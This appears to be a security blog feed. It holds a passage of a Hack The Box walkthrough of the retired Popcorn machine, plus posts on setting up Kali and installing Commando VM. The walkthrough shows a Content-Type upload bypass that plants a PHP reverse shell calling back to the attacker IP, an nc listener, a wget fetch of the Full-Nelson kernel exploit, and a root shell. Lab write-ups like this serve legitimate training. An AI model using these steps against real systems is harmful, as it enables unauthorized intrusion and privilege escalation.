        &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;socket_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;socket_close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;-----------------------------&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6880877471789511041406832871&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;Content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disposition&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;submit&quot;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;Submit&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Screenshot&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;-----------------------------&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6880877471789511041406832871&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Note we specify the content type header in our submission as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type: application/x-php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Lets replay with the Request Editor Feature in ZAP it by right clicking on the data and editing the header as:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;err&quot;&gt;-----------------------------6880877471789511041406832871
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;evil.php&quot;
Content-Type: image/png&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This time I get the following response data:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;err&quot;&gt;Upload: evil.php&amp;lt;br /&amp;gt;Type: image/png&amp;lt;br /&amp;gt;Size: 2.962890625 Kb&amp;lt;br /&amp;gt;Upload Completed. &amp;lt;br /&amp;gt;Please refresh to see the new screenshot.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Looks like the server doesn’t restrict the upload types.&lt;/p&gt;

&lt;p&gt;I set up a listener on my Linux with:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;nc &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 1337&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Right click the “no image found” image url and get a shell:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;listening on [any] 1337 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.6] 48695&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This times out after 20 seconds because of the ZAP proxy settings:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;Failed to read http://10.10.10.6/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php within 20 seconds, check to see if the site is available and if so consider adjusting ZAP's read time out in the Connection options panel.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I disable the proxy and shutdown ZAP as its done its job and re-trigger the connection.&lt;/p&gt;

&lt;p&gt;With this access I have a low priv shell and can claim the user flag.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;priv-escalation&quot;&gt;Priv Escalation&lt;/h2&gt;

&lt;p&gt;I try to upgrade to a bash shell with python:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;/usr/bin/python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But the shell is flaky and times out, I need a better shell but my php sucks.
Luckily Kali comes equiped with webshells.&lt;/p&gt;

&lt;p&gt;I reactivate the proxy on FireFox for ZAP, only this time when I replay I also specify my IP address and 1337 as the port number as well as the Content Type:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;o&quot;&gt;-----------------------------&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1429460769362258019814915645&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;Content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disposition&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php-reverse-shell.php&quot;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;Content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;application&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;set_time_limit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$VERSION&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'10.10.14.34'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// CHANGE THIS&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// CHANGE THIS&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This time my listener returns:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;connect to [10.10.14.34] from (UNKNOWN) [10.10.10.6] 54293
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
 00:06:57 up  2:08,  0 users,  load average: 3.13, 2.86, 1.74
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;and when I upgrade to bash:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;/usr/bin/python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I get:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;www-data@popcorn:/$ &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Typically I now would hammer through a few different enumeration techniques, following a guide like g0tmi1k’s awesome introduction to [Basic Linux Privilege Escalation] (https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/), however I’m instantly drawn to the uname output my shell gave me:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This is a really old kernel build and it probrably has a few exploits kicking about.&lt;/p&gt;

&lt;p&gt;Checking searchsploit gives dozens and dozens, but a couple of nuke level exploits stick out:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;searchsploit linux kernel 2.6 nelson
----------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                               |  Path
                                                                             | (/usr/share/exploitdb/)
----------------------------------------------------------------------------- ----------------------------------------
Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - 'Full-Nelson.c' Local Privileg | exploits/linux/local/15704.c
Linux Kernel &amp;lt; 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson.c' Econet Privilege Es | exploits/linux/local/17787.c
----------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Vaguely recalling a morning commute read the Full and Half Nelsons ring a bell as a reliable and deadly exploit.&lt;/p&gt;

&lt;p&gt;After reading through 15704.c and doing a test compile on the attacker it looks decent enough but I need a compiler for i686 arch to run.&lt;/p&gt;

&lt;p&gt;I check for the gcc compiler on popcorn:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;which gcc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;to get&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;/usr/bin/gcc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Sweet, if I transfer the exploit it should compile, now on a new window I pop a quick python webserver on the attacker:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer 80&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Back to popcorn I move to /tmp pull the exploit over with wget and compile:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; wget http://10.10.14.34/15704.c
gcc 15704.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; evil&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I run the exploit&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;./evil&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Boom! I’m root! W00tW00t!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;From here getting the flags is easy.&lt;/p&gt;

&lt;h2 id=&quot;conclusions&quot;&gt;Conclusions&lt;/h2&gt;

&lt;p&gt;In this post I covered an in-depth look at attacking the Popcorn machine.&lt;/p&gt;

&lt;p&gt;We looked at basic scanning and enumeration of services to find a hidden webapp. I then bypassed the authentication controls via SQLi which gave me admin access to the web app. From here I was able to double down on inadequete file upload santisation to install a reverse shell. From here it was trivial to maintain my persistence and work towards exploiting the insecure kernel.&lt;/p&gt;

&lt;p&gt;This post concludes the &lt;a href=&quot;/posts/#&quot;&gt;KaliSetup&lt;/a&gt; series, where I set up Kali and Commando VMs in HyperV. I then built on the Kali VM to set up for use in &lt;a href=&quot;https://www.hackthebox.eu/home&quot; target=&quot;_blank&quot;&gt;HTB&lt;/a&gt; and then broke into the retired Popcorn machine.&lt;/p&gt;</content><author><name></name></author><category term="LabSetup" /><category term="Kali" /><category term="HTB" /><summary type="html">A while back I re-started my Hack the Box journey, eventually making it to Guru. This post covers my write-up of Popcorn : 10.10.10.6 using Kali Linux.</summary></entry><entry><title type="html">Clean Kali Setup for HTB</title><link href="http://localhost:4000/kalisetup/Clean-Kali-Setup-for-HTB.html" rel="alternate" type="text/html" title="Clean Kali Setup for HTB" /><published>2020-04-19T00:00:00+01:00</published><updated>2020-04-19T00:00:00+01:00</updated><id>http://localhost:4000/kalisetup/Clean-Kali-Setup-for-HTB</id><content type="html" xml:base="http://localhost:4000/kalisetup/Clean-Kali-Setup-for-HTB.html">&lt;p&gt;In this short post I’m going to look at setting up a base Kali image for &lt;a href=&quot;https://www.hackthebox.eu/home&quot; target=&quot;_blank&quot;&gt;HTB&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;prerequisites&quot;&gt;Prerequisites&lt;/h2&gt;

&lt;p&gt;You will need a clean install of Kali Linux, my previous post &lt;a href=&quot;/kalisetup/Windows-Commando-Install.html&quot;&gt;Windows Commando&lt;/a&gt; covers how to build one on Hyper-V and that’s the image I’m starting from.&lt;/p&gt;

&lt;p&gt;You will also need an account for Hack the Box so that you can connect. I won’t be covering how to get an account for it here, as that’s cheating 😉&lt;/p&gt;

&lt;p&gt;If you are really stuck, try looking at the source code.&lt;/p&gt;

&lt;h2 id=&quot;setting-up-the-system&quot;&gt;Setting Up the System&lt;/h2&gt;

&lt;h3 id=&quot;update-the-kali&quot;&gt;Update the Kali&lt;/h3&gt;

&lt;p&gt;I do a full clean and upgrade to ensure everything is up to date before I start:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get clean 
&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get update 
&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get upgrade &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; 
&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get dist-upgrade &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;get-an-ide&quot;&gt;Get an IDE&lt;/h3&gt;

&lt;p&gt;I tend to do all my work from an IDE and for ethical hacking I really like Visual Studio code. It is lightweight and comes with good extensions for a lot of different languages which allows easy context switching. Also with version control build right in, it is easy to save write-ups to a private git repo.&lt;/p&gt;

&lt;p&gt;I need to pull the secure keys for the Microsoft code repo and add reference to it to my apt sources.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;curl &lt;span class=&quot;nt&quot;&gt;-sSL&lt;/span&gt; https://packages.microsoft.com/keys/microsoft.asc | &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-key add -
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sudo tee&lt;/span&gt; /etc/apt/sources.list.d/vscode.list&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Next I need to refresh my packages and install the software&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt update
&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;code &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;additional-tools&quot;&gt;Additional Tools&lt;/h3&gt;

&lt;p&gt;Kali’s default repos offer access to 1000s of tools, many of which have considerable feature overlap. If you can’t find the tools you want in the apt repos, these days the next level tools can readily be found on many a git site. Post IDE install I rarely add anything else on a VM build, I prefer to restore a clean image and reconfigure it as the engagement requires.&lt;/p&gt;

&lt;h3 id=&quot;connect-to-htb&quot;&gt;Connect to HTB&lt;/h3&gt;

&lt;p&gt;On linux this is trivial, the instructions are on the website and the openvpn tool ships with the standard Kali install by default. I don’t have any configuration changes that I &lt;em&gt;need&lt;/em&gt; to make on the VM as it has a public IP address. If my username was BovineHero on HTB then the command would look like this:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;openvpn BovineHero.ovpn&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This opens a new tun0 adapter which connects to Hack the Box’s network.&lt;/p&gt;

&lt;p&gt;I can view the settings with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip&lt;/code&gt; command:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;ip address&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It’ll look something like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\tun0.png&quot; alt=&quot;tun0.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next post &lt;a href=&quot;/kalisetup/HTB-Popcorn-with-Kali.html&quot;&gt;HTB Popcorn Walkthrough with Kali&lt;/a&gt; I’m going posting my writeup for Popcorn a retired box on the platform using Kali.&lt;/p&gt;</content><author><name></name></author><category term="LabSetup" /><category term="HyperV" /><category term="Kali" /><summary type="html">In this short post I’m going to look at setting up a base Kali image for HTB.</summary></entry><entry><title type="html">Windows Commando</title><link href="http://localhost:4000/kalisetup/Windows-Commando-Install.html" rel="alternate" type="text/html" title="Windows Commando" /><published>2020-04-18T00:00:00+01:00</published><updated>2020-04-18T00:00:00+01:00</updated><id>http://localhost:4000/kalisetup/Windows-Commando-Install</id><content type="html" xml:base="http://localhost:4000/kalisetup/Windows-Commando-Install.html">&lt;p&gt;Kali is the industry agreed Linux platform for Penetration Testing. While it is an excellent framework, sometimes it can be challenging getting it to fit Windows use-cases. Often it is simpler just to use Windows, in this post I’m going to setup a Windows Commando VM.&lt;/p&gt;

&lt;h2 id=&quot;prerequisites&quot;&gt;Prerequisites&lt;/h2&gt;

&lt;p&gt;You will need a genuine copy of windows 10 to follow along, &lt;strong&gt;I DO NOT&lt;/strong&gt; recommend running the Commando configuration on bare metal. The setup scripts really strip out the defenses on the OS, so using Commando as your daily driver can be really risky. &lt;strong&gt;You have been warned!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;At time of writing you will need the following spec:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Windows 10 1803, 1809, 1903 or 1909 - Windows 7 is no longer supported. Install should work but issues will not be resolved. New tools will not be added but can be manually installed.&lt;/li&gt;
  &lt;li&gt;60 GB Hard Drive&lt;/li&gt;
  &lt;li&gt;2 GB RAM&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;the-virtual-machine&quot;&gt;The Virtual Machine&lt;/h3&gt;

&lt;p&gt;Building a VM is beyond the scope of this post. I’m using a gen1 hyper-v machine and windows 10, I wrote &lt;a href=&quot;/kalisetup/Kali-Linux-HyperV-Style.html&quot;&gt;Kali Linux HyperV Style&lt;/a&gt; outlining how to set up a Kali VM on Hyper-V, the steps can be easily adapted to Windows 10.&lt;/p&gt;

&lt;p&gt;It doesn’t really matter which platform you chose, there are plenty to chose from and plenty of guides to follow on how to create them. I don’t believe in re-inventing the wheel, nor do I want to sway you in the solution you chose. I repeat, &lt;strong&gt;I DO NOT&lt;/strong&gt; recommend running the Commando configuration on bare metal (although some features will not work as a VM).&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;If you are using Windows to download the image you will need to download the Setup Tool and select the ISO file option to get the image. Pretending to be Linux will let you go straight to the ISO downloads.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As for a new Windows 10 ‘Machine’, I’m using the &lt;strong&gt;Windows.iso&lt;/strong&gt; iso available &lt;a href=&quot;https://www.microsoft.com/en-gb/software-download/windows10&quot;&gt;here&lt;/a&gt;. You may need a valid Activation Key of format (xxxxx-xxxxx-xxxxx-xxxxx-xxxxx) to use images from this source.&lt;/p&gt;

&lt;h3 id=&quot;a-note-about-commando&quot;&gt;A note about Commando&lt;/h3&gt;

&lt;p&gt;This is a short read, but loooong install process. The installer script will throw errors during the process but a re-running it &lt;em&gt;after&lt;/em&gt; it completes will bring you closer to a full install as dependencies are updated and met. You can reduce the tool-set (I won’t be), the Kali Linux subsystem in particular takes a fair chunk of time to finish.&lt;/p&gt;

&lt;p&gt;The Commando &lt;a href=&quot;https://github.com/fireeye/commando-vm&quot;&gt;repo&lt;/a&gt; is basically a powershell script that installs dependencies and packages for a lot of security tools. It runs on an install and forced reboot cycle which can take some time to complete.&lt;/p&gt;

&lt;p&gt;It is still a little experimental, but the install script does a good job of handling issues. It often requires a couple of runs (which are not unattended), but will eventually pick up everything without the need for manual configuration.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\warning.png&quot; alt=&quot;warning.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;While this is tedious, we must remember that the base OS is not designed to accommodate the security tools out of the box, in fact Windows has many layers designed to defend against them.&lt;/p&gt;

&lt;h2 id=&quot;going-commando&quot;&gt;Going Commando&lt;/h2&gt;

&lt;p&gt;Download the installer packages from &lt;a href=&quot;https://github.com/fireeye/commando-vm&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Log into the windows host and open a powershell as an admin.&lt;/p&gt;

&lt;p&gt;Run the following commands to allow unrestricted access for the installer and execute it. (see the risk here?!? 😉)&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;Unblock-File&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\install.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Set-ExecutionPolicy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Unrestricted&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;\install.ps1&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Make sure to turn off Tamper Protection:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\tamperOff.png&quot; alt=&quot;tamperOff.png&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;More detailed Instructions on how to &lt;a href=&quot;https://www.tenforums.com/tutorials/123792-turn-off-tamper-protection-windows-defender-antivirus.html&quot;&gt;Turn off Tamper Protection&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The PoSH terminal will through errors as dependencies need to be met, but following the on screen prompts will eventually produces the framework.&lt;/p&gt;

&lt;p&gt;First time round it reboots:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\cycle.png&quot; alt=&quot;cycle.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;after a few moments it restarts the script:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\KaliSetup\posts\restart.png&quot; alt=&quot;restart.png&quot; /&gt;&lt;/p&gt;

